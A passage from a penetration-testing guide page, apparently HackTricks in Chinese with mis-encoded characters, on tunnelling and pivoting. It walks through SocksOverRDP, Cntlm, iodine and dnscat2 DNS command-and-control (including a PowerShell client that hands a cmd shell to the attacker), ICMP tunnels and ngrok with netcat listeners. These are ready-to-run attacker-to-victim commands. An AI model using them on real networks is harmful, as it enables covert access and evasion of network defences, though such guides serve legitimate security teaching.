<li><a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a> - è¯¥å·¥å…·ä½¿ç”¨Windowsçš„è¿œç¨‹æ¡Œé¢æœåŠ¡åŠŸèƒ½ä¸­çš„<code>Dynamic Virtual Channels</code>ï¼ˆ<code>DVC</code>ï¼‰ã€‚DVCè´Ÿè´£<strong>åœ¨RDPè¿æ¥ä¸Šéš§é“æ•°æ®åŒ…</strong>ã€‚</li>
<li><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></li>
</ol>
<p>åœ¨æ‚¨çš„å®¢æˆ·ç«¯è®¡ç®—æœºä¸ŠåŠ è½½**<code>SocksOverRDP-Plugin.dll</code>**ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-bash"># Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong>RDP</strong> ä½¿ç”¨ <strong><code>mstsc.exe</code></strong> è¿æ¥åˆ° <strong>å—å®³è€…</strong>ï¼Œæˆ‘ä»¬åº”è¯¥æ”¶åˆ°ä¸€ä¸ª <strong>æç¤º</strong>ï¼Œè¯´æ˜ <strong>SocksOverRDP æ’ä»¶å·²å¯ç”¨</strong>ï¼Œå¹¶ä¸”å®ƒå°† <strong>ç›‘å¬</strong> åœ¨ <strong>127.0.0.1:1080</strong>ã€‚</p>
<p>é€šè¿‡ <strong>RDP</strong> è¿æ¥å¹¶åœ¨å—å®³è€…æœºå™¨ä¸Šä¸Šä¼ å¹¶æ‰§è¡Œ <code>SocksOverRDP-Server.exe</code> äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p>
<pre><code>C:\SocksOverRDP-x64&gt; SocksOverRDP-Server.exe
</code></pre>
<p>ç°åœ¨ï¼Œåœ¨ä½ çš„æœºå™¨ï¼ˆæ”»å‡»è€…ï¼‰ä¸Šç¡®è®¤ç«¯å£ 1080 æ­£åœ¨ç›‘å¬ï¼š</p>
<pre><code>netstat -antb | findstr 1080
</code></pre>
<p>ç°åœ¨æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://www.proxifier.com/"><strong>Proxifier</strong></a> <strong>é€šè¿‡è¯¥ç«¯å£ä»£ç†æµé‡ã€‚</strong></p>
<h2 id="ä»£ç†-windows-gui-åº”ç”¨ç¨‹åº"><a class="header" href="#ä»£ç†-windows-gui-åº”ç”¨ç¨‹åº">ä»£ç† Windows GUI åº”ç”¨ç¨‹åº</a></h2>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://www.proxifier.com/"><strong>Proxifier</strong></a> ä½¿ Windows GUI åº”ç”¨ç¨‹åºé€šè¿‡ä»£ç†è¿›è¡Œå¯¼èˆªã€‚<br />
åœ¨ <strong>Profile -&gt; Proxy Servers</strong> ä¸­æ·»åŠ  SOCKS æœåŠ¡å™¨çš„ IP å’Œç«¯å£ã€‚<br />
åœ¨ <strong>Profile -&gt; Proxification Rules</strong> ä¸­æ·»åŠ è¦ä»£ç†çš„ç¨‹åºåç§°å’Œè¦ä»£ç†çš„ IP çš„è¿æ¥ã€‚</p>
<h2 id="ntlm-ä»£ç†ç»•è¿‡"><a class="header" href="#ntlm-ä»£ç†ç»•è¿‡">NTLM ä»£ç†ç»•è¿‡</a></h2>
<p>ä¹‹å‰æåˆ°çš„å·¥å…·ï¼š<strong>Rpivot</strong><br />
<strong>OpenVPN</strong> ä¹Ÿå¯ä»¥ç»•è¿‡å®ƒï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®è¿™äº›é€‰é¡¹ï¼š</p>
<pre><code class="language-bash">http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm
</code></pre>
<h3 id="cntlm"><a class="header" href="#cntlm">Cntlm</a></h3>
<p><a href="http://cntlm.sourceforge.net/">http://cntlm.sourceforge.net/</a></p>
<p>å®ƒå¯¹ä»£ç†è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¹¶åœ¨æœ¬åœ°ç»‘å®šä¸€ä¸ªç«¯å£ï¼Œè¯¥ç«¯å£è½¬å‘åˆ°æ‚¨æŒ‡å®šçš„å¤–éƒ¨æœåŠ¡ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥é€šè¿‡æ­¤ç«¯å£ä½¿ç”¨æ‚¨é€‰æ‹©çš„å·¥å…·ã€‚<br />
ä¾‹å¦‚ï¼Œè½¬å‘ç«¯å£ 443</p>
<pre><code>Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:&lt;attackers_machine&gt;:443
</code></pre>
<p>ç°åœ¨ï¼Œå¦‚æœä½ åœ¨å—å®³è€…çš„<strong>SSH</strong>æœåŠ¡ä¸Šè®¾ç½®ç›‘å¬ç«¯å£ä¸º443ã€‚ä½ å¯ä»¥é€šè¿‡æ”»å‡»è€…çš„2222ç«¯å£è¿æ¥åˆ°å®ƒã€‚<br />
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªè¿æ¥åˆ°localhost:443çš„<strong>meterpreter</strong>ï¼Œæ”»å‡»è€…åœ¨2222ç«¯å£ç›‘å¬ã€‚</p>
<h2 id="yarp"><a class="header" href="#yarp">YARP</a></h2>
<p>ç”±å¾®è½¯åˆ›å»ºçš„åå‘ä»£ç†ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°å®ƒ: <a href="https://github.com/microsoft/reverse-proxy">https://github.com/microsoft/reverse-proxy</a></p>
<h2 id="dns-tunneling"><a class="header" href="#dns-tunneling">DNS Tunneling</a></h2>
<h3 id="iodine"><a class="header" href="#iodine">Iodine</a></h3>
<p><a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a></p>
<p>åœ¨ä¸¤ä¸ªç³»ç»Ÿä¸­éƒ½éœ€è¦rootæƒé™ï¼Œä»¥åˆ›å»ºtuné€‚é…å™¨å¹¶é€šè¿‡DNSæŸ¥è¯¢åœ¨å®ƒä»¬ä¹‹é—´éš§é“æ•°æ®ã€‚</p>
<pre><code>attacker&gt; iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim&gt; iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
</code></pre>
<p>éš§é“å°†ä¼šéå¸¸æ…¢ã€‚æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨æ­¤éš§é“ä¸­åˆ›å»ºä¸€ä¸ªå‹ç¼©çš„SSHè¿æ¥ï¼š</p>
<pre><code>ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
</code></pre>
<h3 id="dnscat2"><a class="header" href="#dnscat2">DNSCat2</a></h3>
<p><a href="https://github.com/iagox86/dnscat2"><strong>ä»è¿™é‡Œä¸‹è½½</strong></a><strong>.</strong></p>
<p>é€šè¿‡DNSå»ºç«‹C&amp;Cé€šé“ã€‚å®ƒä¸éœ€è¦rootæƒé™ã€‚</p>
<pre><code class="language-bash">attacker&gt; ruby ./dnscat2.rb tunneldomain.com
victim&gt; ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker&gt; ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim&gt; ./dnscat2 --dns host=10.10.10.10,port=5353
</code></pre>
<h4 id="åœ¨-powershell-ä¸­"><a class="header" href="#åœ¨-powershell-ä¸­"><strong>åœ¨ PowerShell ä¸­</strong></a></h4>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/lukebaggett/dnscat2-powershell"><strong>dnscat2-powershell</strong></a> åœ¨ PowerShell ä¸­è¿è¡Œ dnscat2 å®¢æˆ·ç«¯ï¼š</p>
<pre><code>Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
</code></pre>
<h4 id="ä½¿ç”¨-dnscat-è¿›è¡Œç«¯å£è½¬å‘"><a class="header" href="#ä½¿ç”¨-dnscat-è¿›è¡Œç«¯å£è½¬å‘"><strong>ä½¿ç”¨ dnscat è¿›è¡Œç«¯å£è½¬å‘</strong></a></h4>
<pre><code class="language-bash">session -i &lt;sessions_id&gt;
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
</code></pre>
<h4 id="æ›´æ”¹-proxychains-dns"><a class="header" href="#æ›´æ”¹-proxychains-dns">æ›´æ”¹ proxychains DNS</a></h4>
<p>Proxychains æ‹¦æˆª <code>gethostbyname</code> libc è°ƒç”¨ï¼Œå¹¶é€šè¿‡ socks ä»£ç†éš§é“ tcp DNS è¯·æ±‚ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œproxychains ä½¿ç”¨çš„ DNS æœåŠ¡å™¨æ˜¯ <strong>4.2.2.2</strong>ï¼ˆç¡¬ç¼–ç ï¼‰ã€‚è¦æ›´æ”¹å®ƒï¼Œè¯·ç¼–è¾‘æ–‡ä»¶ï¼š<em>/usr/lib/proxychains3/proxyresolv</em> å¹¶æ›´æ”¹ IPã€‚å¦‚æœæ‚¨åœ¨ <strong>Windows ç¯å¢ƒ</strong> ä¸­ï¼Œå¯ä»¥è®¾ç½® <strong>åŸŸæ§åˆ¶å™¨</strong> çš„ IPã€‚</p>
<h2 id="go-ä¸­çš„éš§é“"><a class="header" href="#go-ä¸­çš„éš§é“">Go ä¸­çš„éš§é“</a></h2>
<p><a href="https://github.com/hotnops/gtunnel">https://github.com/hotnops/gtunnel</a></p>
<h2 id="icmp-éš§é“"><a class="header" href="#icmp-éš§é“">ICMP éš§é“</a></h2>
<h3 id="hans"><a class="header" href="#hans">Hans</a></h3>
<p><a href="https://github.com/friedrich/hans">https://github.com/friedrich/hans</a><br />
<a href="https://github.com/albertzak/hanstunnel">https://github.com/albertzak/hanstunnel</a></p>
<p>åœ¨ä¸¤ä¸ªç³»ç»Ÿä¸­éƒ½éœ€è¦ root æƒé™ï¼Œä»¥åˆ›å»º tun é€‚é…å™¨å¹¶ä½¿ç”¨ ICMP å›æ˜¾è¯·æ±‚åœ¨å®ƒä»¬ä¹‹é—´éš§é“æ•°æ®ã€‚</p>
<pre><code class="language-bash">./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
</code></pre>
<h3 id="ptunnel-ng"><a class="header" href="#ptunnel-ng">ptunnel-ng</a></h3>
<p><a href="https://github.com/utoni/ptunnel-ng.git"><strong>ä»è¿™é‡Œä¸‹è½½</strong></a>ã€‚</p>
<pre><code class="language-bash"># Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p &lt;server_ip&gt; -l &lt;listen_port&gt; -r &lt;dest_ip&gt; -R &lt;dest_port&gt;
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
</code></pre>
<h2 id="ngrok"><a class="header" href="#ngrok">ngrok</a></h2>
<p><a href="https://ngrok.com/"><strong>ngrok</strong></a> <strong>æ˜¯ä¸€ä¸ªé€šè¿‡ä¸€æ¡å‘½ä»¤è¡Œå°†è§£å†³æ–¹æ¡ˆæš´éœ²åˆ°äº’è”ç½‘çš„å·¥å…·ã€‚</strong><br />
&amp;#xNAN;<em>Exposition URI ç±»ä¼¼äºï¼š</em> <strong>UID.ngrok.io</strong></p>
<h3 id="å®‰è£…"><a class="header" href="#å®‰è£…">å®‰è£…</a></h3>
<ul>
<li>åˆ›å»ºä¸€ä¸ªè´¦æˆ·ï¼š https://ngrok.com/signup</li>
<li>å®¢æˆ·ç«¯ä¸‹è½½ï¼š</li>
</ul>
<pre><code class="language-bash">tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
#Â Init configuration, with your token
./ngrok config edit
</code></pre>
<h3 id="åŸºæœ¬ç”¨æ³•"><a class="header" href="#åŸºæœ¬ç”¨æ³•">åŸºæœ¬ç”¨æ³•</a></h3>
<p><strong>æ–‡æ¡£:</strong> <a href="https://ngrok.com/docs/getting-started/">https://ngrok.com/docs/getting-started/</a>.</p>
<p><em>å¦‚æœéœ€è¦ï¼Œä¹Ÿå¯ä»¥æ·»åŠ èº«ä»½éªŒè¯å’ŒTLSã€‚</em></p>
<h4 id="éš§é“-tcp"><a class="header" href="#éš§é“-tcp">éš§é“ TCP</a></h4>
<pre><code class="language-bash"># Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
</code></pre>
<h4 id="é€šè¿‡httpæš´éœ²æ–‡ä»¶"><a class="header" href="#é€šè¿‡httpæš´éœ²æ–‡ä»¶">é€šè¿‡HTTPæš´éœ²æ–‡ä»¶</a></h4>
<pre><code class="language-bash">./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
</code></pre>
<h4 id="å—…æ¢-http-è°ƒç”¨"><a class="header" href="#å—…æ¢-http-è°ƒç”¨">å—…æ¢ HTTP è°ƒç”¨</a></h4>
<p><em>å¯¹ XSS, SSRF, SSTI ... æœ‰ç”¨</em><br />
ç›´æ¥ä» stdout æˆ–åœ¨ HTTP æ¥å£ <a href="http://127.0.0.1:4000">http://127.0.0.1:4040</a>ã€‚</p>
<h4 id="éš§é“å†…éƒ¨-http-æœåŠ¡"><a class="header" href="#éš§é“å†…éƒ¨-http-æœåŠ¡">éš§é“å†…éƒ¨ HTTP æœåŠ¡</a></h4>
<pre><code class="language-bash">./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
#Â With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
</code></pre>
<h4 id="ngrokyaml-ç®€å•é…ç½®ç¤ºä¾‹"><a class="header" href="#ngrokyaml-ç®€å•é…ç½®ç¤ºä¾‹">ngrok.yaml ç®€å•é…ç½®ç¤ºä¾‹</a></h4>
<p>å®ƒæ‰“å¼€ 3 ä¸ªéš§é“ï¼š</p>
<ul>
<li>2 ä¸ª TCP</li>
<li>1 ä¸ª HTTPï¼Œé™æ€æ–‡ä»¶ä» /tmp/httpbin/ æš´éœ²</li>
</ul>
<pre><code class="language-yaml">tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
</code></pre>
<h2 id="å…¶ä»–æ£€æŸ¥å·¥å…·"><a class="header" href="#å…¶ä»–æ£€æŸ¥å·¥å…·">å…¶ä»–æ£€æŸ¥å·¥å…·</a></h2>
<ul>
<li><a href="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a></li>
<li><a href="https://github.com/z3APA3A/3proxy">https://github.com/z3APA3A/3proxy</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../generic-hacking/search-exploits.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../linux-hardening/linux-privilege-escalation-checklist.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../generic-hacking/search-exploits.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../linux-hardening/linux-privilege-escalation-checklist.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
